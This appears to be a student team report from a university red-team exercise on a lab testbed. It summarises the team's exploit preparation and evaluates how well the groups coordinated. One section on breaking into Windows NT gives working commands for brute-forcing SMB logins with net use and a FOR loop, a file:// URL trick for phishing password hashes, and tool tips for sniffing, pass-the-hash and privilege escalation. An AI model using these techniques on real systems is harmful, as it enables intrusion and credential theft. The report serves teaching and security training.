Preparation

Jingyu collected our two functional remote exploits almost immediately. Feifei had found two other remote exploits, which we worked on during our first meeting, but they were unsuccessful on the testbed.

In the next week, Jingyu examined ssh exploits. We were unsuccessful with these, because they required modifications to the ssh programs on the client and/or server. He tried installing a new client, but the installation involved many parameters and the resultant exploits were unsuccessful. We also found an excellent website with an extensive archive of exploits. We downloaded and tested each of these on the testbed, but only two of them worked. Both were versions of the two successful exploits which Jingyu had already collected. We also examined and installed backdoors on the testbed.

In the third week, one of our members volunteered to lead our Windows NT efforts. He examined password cracking, and has been hacking into the Windows NT testbed computer from his Windows NT station in the Geography building. During this time, we also examined several SunOS 5.7 exploits. But, we had great difficulty with these and were unable to successfully attack the Solaris computer. Other members of our group (Ashish and Andrew) worked on scripts to automate the process. They also included steps to obtain the password file and mail it to Maria in hopes that the cracking of some passwords on the Linux boxes would allow us to access the Solaris box. The third week also involved extra coordination with the vulnerability scanning team as well as the flag acquisition team. During the test run, the flag acquisition team's script had difficulty with the primitive TCP connection our remote exploits established. Working around this was not difficult.

On the day before the attack, we incorporated the script from the flag acquisition team into our script. We also received a draft version of the escalation team's script, but were unable to incorporate it into our own.

  • report from Jianyu (NT break-in)

    
The first thing in our mind is that a remote intruder is nothing but 
Administrator. However, NT does not (by default) provide the capacity to 
execute commands remotely, and even it did, interative log on to NT server 
is restricted to a administrative accounts, severely limiting the ability of 
remote (non-Admin) users to do damage. 

    
Thus, one of the most primary machanism for gaining Administrator priviliage 
is to guessing passwords. Usually the NetBIOS Session service TCP 139 is 
availableon a NT installed on defaults. The most effective method for 
breaking into NT is good, old fashioned, remote password guesing: attempting 
to connect to an enumerated share and trying username/passwrod combination 
until you find one that works.

    
Finding an appropriate share point to attack is trivial. The Interprocess 
Communication "share" (IPC$) that is invariably present on systems exporting 
TCP 139.In addition, the default administrative shars including ADMIN$ AND 
{%systemdrive%]$ (e.g., c$), are also almost always present to enable password guessing.
Password guessing can be carried out via the command line, using the net use command.  
Specifying an asterisk(*) instead of a password causes the remote system to 
prompt for one as show:

    C:\> net use \\128.111.54.40\IPC$ * /user:Administrator
Type the password for \\128.111.54.40\IPC$:

    
Note password guessing is the most surgical when it leverages age-old user 
password selection errors. Usually users tend to choose the easiest password 
possible--i.e. no password. Or they choose something that is easy to remember, 
like their username or their first name. Also a lot of popular software runs 
under the context of an NT user account.These account names generally become 
public knowledge over time, ane even worse, are generally set to something 
memorable.

    
Password guessing can be performed automatically. We may simply whip up a loop 
using the NT shell FOR command based on the standard NET USE syntax. First 
create a simple username and password file based on the high probability 
combination. Such a file might look something like the following:

    [file:credentials.txt]
paasword username
admin	Administrator
secret	Administrator
etc....

    
Then we can feed this file to our FOR command like so:

    C:\> FOR /F "tokens=1,2*" %i in (credentials.txt) do net use \\128.111.54.40\IPC$ %i /u:%j

    
Many dedicated software programs that automate password guessing. Legion and 
NetBIOS Auduiting Tool(NAT). Legion can scan multiple class C IP address 
ranges from Windows shares and also offers a manual dictionary attack too.
NAT perofmrs a similar function, albeit one target at a time. It operates 
from the command line. NAT will connect to a target system and then attempt 
to guess passwords from a predefined array and user-supplied lists.

    
Another good tool is from Network Associates Inc.'s (NAI), their products 
CyberCop Scanner comes with a utility called SMBGrind that is extremely fast, 
because it can set up multiple grinders running in parallel. But the tool is 
a commercial product. Obviously we have no budget for it.

    
Password guessing is hard work. The other way is to sniff credentials off the 
wrie as users log in to a server and then replay them to gain access. This 
approach can spare a lot of random guesswork. L0phtcarck available at 
http://www.l0pht.com can do this job. L0 phtcrack is an NT password-guessing 
tool that usually works offline against a captured NT password database.  It 
also includes a function called SMB Packet Capture that bypasses the need the 
capture the password file. SMB Packet Capture listens to the local network 
segment and captures the individual login sessions between NT systems, strips 
out the hashed password information, and reverse-engineers the standard NT 
one-way function. The effectiveness of th reverse-engineering applied by SMB 
caputure with the main L0phtcrack password-cracking engine is such that 
anyone who can sniff the wire for extended periods is most certainly 
guaranteed to obtain Administrator status in a matter of days.

    
Here is one way of using social engineering to get the password hash.  Just 
send out an email to our target. whether it is an individual or a company.  
Include in it a URL in the form of 

    file:////yourcomputer/sharename/message.html

     

When people click that URL they will be sending their password hashes to you 
for authentication.

    
Another novel thought is: if one somehow came into possession of a valid use 
password hash value (say from an SMB capture session or a captured NT SAM 
file), he maybe use them in a normal respnose to a logon challenge. Then he 
could log on to a server without knowledge of a viable password, just a user 
name and corresponding password hash value. A paper discussing the technical 
details of passing the hash writtern by CORE-SDI's Hernan Ochoa is available
 at http://www.core-sdi.com/papers/nt_cred.htm.

    
We examined privilege escalation as a byproduct of remote access searching.  
If intruders find a non-Admin user account, their may locally by using some 
tools escalates to get Administrator's privileges. 

    
Getadmin is a small program written by Knostantin Sobolev that adds a user 
to the local Administrator groups. It uses a low-level NT kernel routine to 
set a global flag allowing access to any running process, then uses a 
technique called DLL injection to insert malicious code into a process that 
has the privileges to add users to the Administrator group.

Evaluation

The Attack:

During our trial run, it was clear that inter-group communication was the primary weakness of the Red team. Intra-group communication was better, but it was still difficult. The trial run alerted our team to the need for improved coordination between our group and the flag acquisition team, so we worked harder during the weekend to coordinate with this and the vulnerability scanning group. On attack day, Ashish and Andrew stationed themselves in the thick of it (next to a representative from the topology team), but the flag team seemed unable to squeeze a representative into this highly congested area.

Giovanni bribed the system administrator into providing us with temporary administration privledges on a Windows NT machine in the graduate NT lab. Our NT expert began downloading his programs.

The attack began with a very effective denial of service attack by the Red team against itself. Congestion crippled the network almost as badly as it clogged the walkways. Communication was difficult. Many people had no idea what was going on, and Ashish and Andrew were continually bombarded with update queries from members of our group and other groups.

Suggestions for future improvements:

I think that the attack may have been more successful if each team had sent only 1-3 representatives. Andrew, Ashish, and Jianyu (for Windows NT) were enough from our group. Bandwidth and network instability seemed to be a problem for the flag acquisition team, and subtlety was hopelessly lost.

A designated messanger might have been useful. Email was the primary form of contact before the attack, but paper messages seemed to work much better during the attack.

A different group structure may have helped. One issue is streamlining, since, even if each group sent only 3 representatives, communication would be difficult with 18 representatives from 6 different groups. Another issue was task overlap. Our group found remote access exploits which obtained root access immediately. Also, we encountered many escalation exploits while hunting for Redhat 6.2 remote access exploits. So, it seems that remote access and escalation on a single platform should be handled by a single group.

I would suggest the following division of groups:

  • Scanning (2)
  • Solaris exploit (2)
  • Linux exploit (3)
  • NT scanning, exploit, and flag acquisition (3)
  • Solaris and Linux flag acquisition (2)
  • Automation / Management (5)
Under this division, the automation team would be the only group to have control of the network during the attack. They would have one or two members in each of the other groups. These members would attend the meetings of both groups. So, the automation team sits in the middle of a three-level group hierarchy (where the Dan group is the root). They would combine the results from each of the other groups and prepare a consistent set of scripts for the attack.

On attack day, a slightly different group structure could be defined. This structure might include one person in charge of communications. It might also include a backup group which would be available to handle unplanned events as they arise.

  my ($host) = @_;
